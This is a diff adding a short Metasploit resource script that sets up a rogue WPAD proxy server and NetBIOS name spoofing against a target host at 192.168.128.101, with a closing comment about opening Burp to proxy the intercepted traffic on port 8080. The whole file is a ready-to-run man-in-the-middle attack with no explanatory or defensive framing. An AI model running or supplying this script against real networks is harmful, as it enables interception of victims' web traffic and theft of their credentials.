@@ -1,0 +1,13 @@
+use auxiliary/server/wpad 
+set PROXY 192.168.128.61
+set PROXYPORT 8080
+set SRVHOST 192.168.128.61
+set SRVPORT 80
+exploit
+
+use auxiliary/admin/netbios/netbios_spoof 
+set NBADDR 192.168.128.61
+set RHOST 192.168.128.101
+exploit
+
+# open burp for proxying to port 8080
